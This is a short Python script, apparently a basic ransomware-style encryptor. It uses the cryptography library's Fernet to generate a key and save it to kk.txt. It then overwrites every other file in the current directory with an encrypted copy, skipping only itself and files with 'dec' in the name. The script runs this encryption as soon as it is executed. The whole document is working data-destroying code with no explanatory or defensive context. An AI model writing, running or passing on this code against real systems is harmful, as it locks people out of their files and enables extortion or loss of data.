import os
from cryptography.fernet import Fernet

files = [file for file in os.listdir() if (os.path.isfile(file) and file not in __file__ and "dec" not in file and file != "kk.txt")]

def encrypt(files):
    key = Fernet.generate_key()
    
    with open("kk.txt", 'wb') as kf:
        kf.write(key)

    for file in files:
        with open(file, 'rb') as fl:
            a = fl.read()

        try :
            aec = Fernet(key).encrypt(a)

        except:
            continue

        with open(file, 'wb') as fl:
            fl.write(aec)

encrypt(files)
